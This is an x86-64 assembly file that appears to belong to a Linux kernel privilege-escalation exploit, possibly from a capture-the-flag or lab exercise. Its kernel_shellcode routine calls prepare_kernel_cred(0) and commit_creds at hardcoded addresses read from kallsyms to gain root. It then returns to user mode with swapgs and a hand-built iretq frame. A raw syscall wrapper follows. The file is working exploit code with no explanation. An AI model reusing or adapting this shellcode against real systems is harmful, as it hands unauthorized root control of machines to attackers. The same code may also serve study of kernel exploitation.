.text
.intel_syntax noprefix

.global syscall64
.global kernel_shellcode

kernel_shellcode:
    # commit_cred(prepare_kernel_creds(0))
    xor rdi, rdi
    mov rcx, 0xffffffff81052a60     # cat kallsyms | grep prepare_kernel_creds
    call rcx
    mov rdi, rax
    mov rcx, 0xffffffff81052830     # cat kallsyms | grep commit_creds
    call rcx
context_switch:
    swapgs
    # ss
    mov r15, 0x2b
    push 0x2b 
    # rsp - mmapped value
    mov r15, 0xcafe000
    push r15
    # rflags - dummy value
    mov r15, 0x246
    push r15
    # cs
    mov r15, 0x33
    push r15
    # rip - mmapped value
    mov r15, 0x1234000
    push r15
    iretq
end_kernel_shellcode:
    nop

syscall64:
    pop r14
    pop r15
    push r15
    push r14
    sub rsp, 0x100

    mov rax, rdi
    mov rdi, rsi
    mov rsi, rdx
    mov rdx, rcx
    mov r10, r8
    mov r8,r9 
    mov r9, r15
    syscall

    add rsp, 0x100
    ret
